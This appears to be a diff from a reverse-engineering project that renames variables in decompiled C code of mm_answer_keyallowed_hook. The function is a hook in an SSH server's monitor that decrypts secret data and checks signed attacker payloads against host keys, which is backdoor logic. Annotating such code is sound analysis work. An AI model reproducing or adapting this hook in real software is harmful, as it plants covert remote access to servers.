@@ -50,10 +50,10 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   sshbuf payload_buf;
   global_context_t *global_ctx;
   libc_imports_t *libc_imports;
-  u8 local_131 [57];
+  u8 payload_seed_buf[57];
   sshd_payload_ctx_t *payload_ctx;
   sshd_monitor_func_t orig_handler;
-  u8 local_aa [122];
+  u8 payload_header_buf[122];
   
   ctx = ::global_ctx;
   bVar23 = 0;
@@ -164,66 +164,66 @@ LAB_001092e5:
   else if ((int)uVar3 < 4) {
     if (uVar3 == 0) {
       if (ctx->current_data_size < 0xae) goto LAB_0010944f;
-      puVar21 = local_131 + 0x10;
+      puVar21 = payload_seed_buf + 0x10;
       for (lVar17 = 0x29; lVar17 != 0; lVar17 = lVar17 + -1) {
         *puVar21 = '\0';
         puVar21 = puVar21 + (ulong)bVar23 * -2 + 1;
       }
       puVar21 = ctx->payload_data;
-      local_131[0] = '\0';
-      local_131[1] = '\0';
-      local_131[2] = '\0';
-      local_131[3] = '\0';
-      local_131[4] = '\0';
-      local_131[5] = '\0';
-      local_131[6] = '\0';
-      local_131[7] = '\0';
-      local_131[8] = '\0';
-      local_131[9] = '\0';
-      local_131[10] = '\0';
-      local_131[0xb] = '\0';
-      local_131[0xc] = '\0';
-      local_131[0xd] = '\0';
-      local_131[0xe] = '\0';
-      local_131[0xf] = '\0';
+      payload_seed_buf[0] = '\0';
+      payload_seed_buf[1] = '\0';
+      payload_seed_buf[2] = '\0';
+      payload_seed_buf[3] = '\0';
+      payload_seed_buf[4] = '\0';
+      payload_seed_buf[5] = '\0';
+      payload_seed_buf[6] = '\0';
+      payload_seed_buf[7] = '\0';
+      payload_seed_buf[8] = '\0';
+      payload_seed_buf[9] = '\0';
+      payload_seed_buf[10] = '\0';
+      payload_seed_buf[0xb] = '\0';
+      payload_seed_buf[0xc] = '\0';
+      payload_seed_buf[0xd] = '\0';
+      payload_seed_buf[0xe] = '\0';
+      payload_seed_buf[0xf] = '\0';
       if (((puVar21 != (u8 *)0x0) && (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
          ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
           (ctx->sshd_payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
         ctx->sshd_payload_ctx = puVar21;
-        local_aa[0] = '\0';
-        local_aa[1] = '\0';
-        local_aa[2] = '\0';
-        local_aa[3] = '\0';
-        local_aa[4] = '\0';
-        local_aa[5] = '\0';
-        local_aa[6] = '\0';
-        local_aa[7] = '\0';
-        local_aa[8] = '\0';
-        local_aa[9] = '\0';
-        local_aa[10] = '\0';
-        local_aa[0xb] = '\0';
-        local_aa[0xc] = '\0';
-        local_aa[0xd] = '\0';
-        local_aa[0xe] = '\0';
-        local_aa[0xf] = '\0';
-        puVar20 = local_aa + 0x10;
+        payload_header_buf[0] = '\0';
+        payload_header_buf[1] = '\0';
+        payload_header_buf[2] = '\0';
+        payload_header_buf[3] = '\0';
+        payload_header_buf[4] = '\0';
+        payload_header_buf[5] = '\0';
+        payload_header_buf[6] = '\0';
+        payload_header_buf[7] = '\0';
+        payload_header_buf[8] = '\0';
+        payload_header_buf[9] = '\0';
+        payload_header_buf[10] = '\0';
+        payload_header_buf[0xb] = '\0';
+        payload_header_buf[0xc] = '\0';
+        payload_header_buf[0xd] = '\0';
+        payload_header_buf[0xe] = '\0';
+        payload_header_buf[0xf] = '\0';
+        puVar20 = payload_header_buf + 0x10;
         for (lVar17 = 0x4a; lVar17 != 0; lVar17 = lVar17 + -1) {
           *puVar20 = '\0';
           puVar20 = puVar20 + (ulong)bVar23 * -2 + 1;
         }
         lVar17 = 0;
         do {
-          local_aa[lVar17] = puVar21[lVar17 + 2];
+          payload_header_buf[lVar17] = puVar21[lVar17 + 2];
           lVar17 = lVar17 + 1;
         } while (lVar17 != 0x3a);
-        BVar11 = secret_data_get_decrypted(local_131,ctx);
+        BVar11 = secret_data_get_decrypted(payload_seed_buf,ctx);
         if ((BVar11 != FALSE) &&
            (BVar11 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
-                                      [ctx->sshd_host_pubkey_idx],local_aa,0x3a,0x5a,
-                                      ctx->sshd_payload_ctx + 0x3c,local_131,ctx), BVar11 != FALSE))
+                                      [ctx->sshd_host_pubkey_idx],payload_header_buf,0x3a,0x5a,
+                                      ctx->sshd_payload_ctx + 0x3c,payload_seed_buf,ctx), BVar11 != FALSE))
         {
           ctx->payload_state = 1;
-          puVar21 = local_131;
+          puVar21 = payload_seed_buf;
           for (lVar17 = 0x39; lVar17 != 0; lVar17 = lVar17 + -1) {
             *puVar21 = '\0';
             puVar21 = puVar21 + (ulong)bVar23 * -2 + 1;
@@ -249,23 +249,23 @@ LAB_00109471:
           }
           return 0;
         }
-        local_aa[0] = '\0';
-        local_aa[1] = '\0';
-        local_aa[2] = '\0';
-        local_aa[3] = '\0';
-        local_aa[4] = '\0';
-        local_aa[5] = '\0';
-        local_aa[6] = '\0';
-        local_aa[7] = '\0';
-        local_aa[8] = '\0';
-        local_aa[9] = '\0';
-        local_aa[10] = '\0';
-        local_aa[0xb] = '\0';
-        local_aa[0xc] = '\0';
-        local_aa[0xd] = '\0';
-        local_aa[0xe] = '\0';
-        local_aa[0xf] = '\0';
-        puVar21 = local_aa + 0x10;
+        payload_header_buf[0] = '\0';
+        payload_header_buf[1] = '\0';
+        payload_header_buf[2] = '\0';
+        payload_header_buf[3] = '\0';
+        payload_header_buf[4] = '\0';
+        payload_header_buf[5] = '\0';
+        payload_header_buf[6] = '\0';
+        payload_header_buf[7] = '\0';
+        payload_header_buf[8] = '\0';
+        payload_header_buf[9] = '\0';
+        payload_header_buf[10] = '\0';
+        payload_header_buf[0xb] = '\0';
+        payload_header_buf[0xc] = '\0';
+        payload_header_buf[0xd] = '\0';
+        payload_header_buf[0xe] = '\0';
+        payload_header_buf[0xf] = '\0';
+        puVar21 = payload_header_buf + 0x10;
         for (lVar17 = 0x62; lVar17 != 0; lVar17 = lVar17 + -1) {
           *puVar21 = '\0';
           puVar21 = puVar21 + (ulong)bVar23 * -2 + 1;
@@ -274,7 +274,7 @@ LAB_00109471:
         lVar17 = 0;
         do {
           lVar13 = lVar17 + 1;
-          local_aa[lVar17] = puVar21[lVar17 + uVar18];
+          payload_header_buf[lVar17] = puVar21[lVar17 + uVar18];
           lVar17 = lVar13;
         } while (lVar13 != 0x72);
         if ((uVar15 < uVar18) || (uVar14 = 0, uVar15 - uVar18 < uVar6)) goto LAB_00109471;
@@ -283,7 +283,7 @@ LAB_00109471:
         }
         BVar11 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                   ctx->payload_data,uVar18 + ctx->sock_read_buf_size,
-                                  ctx->payload_data_size,local_aa,ctx->sshd_payload_ctx + 2,ctx);
+                                  ctx->payload_data_size,payload_header_buf,ctx->sshd_payload_ctx + 2,ctx);
         if (BVar11 == FALSE) {
           ctx->payload_state = 0xffffffff;
           goto LAB_00109471;
